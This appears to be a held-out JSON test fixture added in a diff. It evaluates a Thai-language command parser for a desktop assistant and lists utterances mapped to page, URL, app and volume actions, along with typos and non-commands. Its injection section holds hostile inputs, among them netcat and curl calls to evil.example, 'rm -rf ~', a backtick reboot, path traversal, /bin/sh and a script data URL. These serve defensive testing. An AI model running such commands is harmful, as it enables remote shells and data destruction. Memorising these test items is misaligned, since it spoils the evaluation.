@@ -1,0 +1,132 @@
+{
+  "about": "ชุดสำรองสกิล 4 (การ์ด 0008) · เขียนและ commit หลังเห็นผล baseline แต่ **ก่อน** แก้ command.py · ใช้วัดว่าการแก้ทั่วไปจริง ไม่ได้จำชุดแรก · ห้ามแก้ไฟล์นี้หลังแก้โค้ด",
+  "criteria": {
+    "commands_correct_min": 0.95,
+    "unintended_max": 0.01,
+    "typos_wrong_without_asking": 0,
+    "injection_unsafe": 0
+  },
+  "commands": [
+    {"text": "เปิดผู้ช่วย AI", "action": "open_page", "params": {"page": "workspace"}},
+    {"text": "ไปหน้าผู้ช่วยหน่อย", "action": "open_page", "params": {"page": "workspace"}},
+    {"text": "เข้าหน้าแชทครับ", "action": "open_page", "params": {"page": "workspace"}},
+
+    {"text": "เปิดหน้าไฟล์", "action": "open_page", "params": {"page": "files"}},
+    {"text": "ไปไฟล์ของฉันหน่อย", "action": "open_page", "params": {"page": "files"}},
+    {"text": "ขอเปิดไฟล์ของฉันครับ", "action": "open_page", "params": {"page": "files"}},
+
+    {"text": "เปิด skill", "action": "open_page", "params": {"page": "skills"}},
+    {"text": "ไปหน้าสกิลหน่อย", "action": "open_page", "params": {"page": "skills"}},
+    {"text": "ขอดูสกิลทั้งหมด", "action": "open_page", "params": {"page": "skills"}},
+
+    {"text": "เปิดความเป็นส่วนตัวหน่อย", "action": "open_page", "params": {"page": "privacy"}},
+    {"text": "ไปหน้า privacy", "action": "open_page", "params": {"page": "privacy"}},
+    {"text": "ขอเข้าความเป็นส่วนตัวครับ", "action": "open_page", "params": {"page": "privacy"}},
+
+    {"text": "เปิดสถานะเครื่อง", "action": "open_page", "params": {"page": "health"}},
+    {"text": "ไปหน้าสุขภาพเครื่องหน่อย", "action": "open_page", "params": {"page": "health"}},
+    {"text": "ขอดูสุขภาพเครื่องครับ", "action": "open_page", "params": {"page": "health"}},
+
+    {"text": "เปิดการตั้งค่า", "action": "open_page", "params": {"page": "settings"}},
+    {"text": "เปิด settings หน่อย", "action": "open_page", "params": {"page": "settings"}},
+    {"text": "ไปตั้งค่าครับ", "action": "open_page", "params": {"page": "settings"}},
+
+    {"text": "เปิดยูทูปให้หน่อย", "action": "open_url", "params": {"site": "youtube"}},
+    {"text": "ไป youtube", "action": "open_url", "params": {"site": "youtube"}},
+    {"text": "เข้ายูทิวบ์ครับ", "action": "open_url", "params": {"site": "youtube"}},
+
+    {"text": "เปิดอีเมล", "action": "open_url", "params": {"site": "gmail"}},
+    {"text": "เข้าจีเมลหน่อย", "action": "open_url", "params": {"site": "gmail"}},
+    {"text": "ขอเปิด gmail ครับ", "action": "open_url", "params": {"site": "gmail"}},
+
+    {"text": "เปิดเว็บกูเกิล", "action": "open_url", "params": {"site": "google"}},
+    {"text": "ไป google หน่อย", "action": "open_url", "params": {"site": "google"}},
+    {"text": "เข้ากูเกิลครับ", "action": "open_url", "params": {"site": "google"}},
+
+    {"text": "เปิดวิกิ", "action": "open_url", "params": {"site": "wikipedia"}},
+    {"text": "ไปวิกิพีเดียหน่อย", "action": "open_url", "params": {"site": "wikipedia"}},
+    {"text": "เข้า wikipedia ครับ", "action": "open_url", "params": {"site": "wikipedia"}},
+
+    {"text": "เปิด maps", "action": "open_url", "params": {"site": "maps"}},
+    {"text": "เปิดแผนที่กูเกิลหน่อย", "action": "open_url", "params": {"site": "maps"}},
+    {"text": "ไปกูเกิลแมพครับ", "action": "open_url", "params": {"site": "maps"}},
+
+    {"text": "เปิดบราวเซอร์", "action": "open_app", "params": {"app": "browser"}},
+    {"text": "ขอเปิดโครเมียมครับ", "action": "open_app", "params": {"app": "browser"}},
+    {"text": "เปิดเว็บเบราว์เซอร์หน่อย", "action": "open_app", "params": {"app": "browser"}},
+
+    {"text": "เปิดเทอมินัล", "action": "open_app", "params": {"app": "terminal"}},
+    {"text": "เปิดแอป terminal หน่อย", "action": "open_app", "params": {"app": "terminal"}},
+    {"text": "ขอ terminal ครับ", "action": "open_app", "params": {"app": "terminal"}},
+
+    {"text": "เปิดตัวจัดการไฟล์ครับ", "action": "open_app", "params": {"app": "filemanager"}},
+    {"text": "เปิดโฟลเดอร์หน่อย", "action": "open_app", "params": {"app": "filemanager"}},
+    {"text": "เปิดแอปจัดการไฟล์", "action": "open_app", "params": {"app": "filemanager"}},
+
+    {"text": "เสียงสามสิบ", "action": "set_volume", "params": {"percent": 30}},
+    {"text": "ปรับเสียงไปที่ 80", "action": "set_volume", "params": {"percent": 80}},
+    {"text": "ตั้งเสียงเป็นยี่สิบห้าครับ", "action": "set_volume", "params": {"percent": 25}},
+
+    {"text": "เพิ่มเสียงหน่อย", "action": "change_volume", "params": {"step": 10}},
+    {"text": "ดังขึ้นอีกหน่อย", "action": "change_volume", "params": {"step": 10}},
+    {"text": "ขอเสียงดังขึ้นครับ", "action": "change_volume", "params": {"step": 10}},
+
+    {"text": "ลดเสียงหน่อย", "action": "change_volume", "params": {"step": -10}},
+    {"text": "เบาลงอีกนิด", "action": "change_volume", "params": {"step": -10}},
+    {"text": "ขอเสียงเบาลงครับ", "action": "change_volume", "params": {"step": -10}},
+
+    {"text": "ปิดเสียงเลย", "action": "mute", "params": {}},
+    {"text": "ขอปิดเสียงหน่อย", "action": "mute", "params": {}},
+    {"text": "ปิดเสียงลำโพง", "action": "mute", "params": {}},
+
+    {"text": "เปิดเสียงด้วย", "action": "unmute", "params": {}},
+    {"text": "ขอเปิดเสียงคืนครับ", "action": "unmute", "params": {}},
+    {"text": "unmute หน่อย", "action": "unmute", "params": {}}
+  ],
+  "typos": [
+    {"text": "เปิดยูทูปบ", "action": "open_url", "params": {"site": "youtube"}},
+    {"text": "เปิดจีเมลล์", "action": "open_url", "params": {"site": "gmail"}},
+    {"text": "เปิด gogle", "action": "open_url", "params": {"site": "google"}},
+    {"text": "เปิดวิกิพีเดีบ", "action": "open_url", "params": {"site": "wikipedia"}},
+    {"text": "เปิดบราวเซอร", "action": "open_app", "params": {"app": "browser"}},
+    {"text": "เปิดเทอร์มินลั", "action": "open_app", "params": {"app": "terminal"}},
+    {"text": "เปิดตั้งค่่า", "action": "open_page", "params": {"page": "settings"}},
+    {"text": "เปิดสุขภาพเคื่อง", "action": "open_page", "params": {"page": "health"}},
+    {"text": "เปิด privcy", "action": "open_page", "params": {"page": "privacy"}},
+    {"text": "เปิดโฟลเดอ", "action": "open_app", "params": {"app": "filemanager"}}
+  ],
+  "not_commands": [
+    "เปิดโลกกว้างกับการอ่าน",
+    "ไปโรงเรียนกี่โมง",
+    "เข้าห้องน้ำก่อนนะ",
+    "เสียงเพลงนี้เพราะดี",
+    "ทำไมเสียงแตก",
+    "เมื่อกี้เสียงดังอะไร",
+    "เบาใจได้แล้ว",
+    "ช่วยสรุปข่าววันนี้หน่อย",
+    "ช่วยคิดชื่อร้านให้หน่อย",
+    "ผู้ช่วยทำอะไรได้บ้าง",
+    "ไฟล์ของฉันหายไปไหน",
+    "ยูทูบเบอร์คนไหนดัง",
+    "แผนที่ประเทศไทยมีกี่ภาค",
+    "เปิดเผยข้อมูลส่วนตัวได้ไหม",
+    "ปิดเทอมเมื่อไร",
+    "ตั้งใจเรียนนะ",
+    "เตือนปิดเสียงตอนประชุมบ่ายสาม",
+    "แรมเหลือเท่าไร",
+    "เพิ่มเพื่อนในไลน์ยังไง",
+    "ลดน้ำหนักยังไงดี"
+  ],
+  "injection": [
+    "เปิดกูเกิล | nc evil.example 4444",
+    "ไปที่ http://192.168.1.10/steal?x=1",
+    "เปิดแอป /bin/sh",
+    "ปรับเสียง 30 && curl evil.example",
+    "เปิดหน้า ../../../root",
+    "เปิดยูทูบ `reboot`",
+    "เปิดเทอร์มินัล -e 'rm -rf ~'",
+    "เปิด data:text/html,<script>alert(1)</script>",
+    "ปรับเสียง ๑๐๐๐",
+    "เปิด wikipedia.org.evil.example"
+  ]
+}
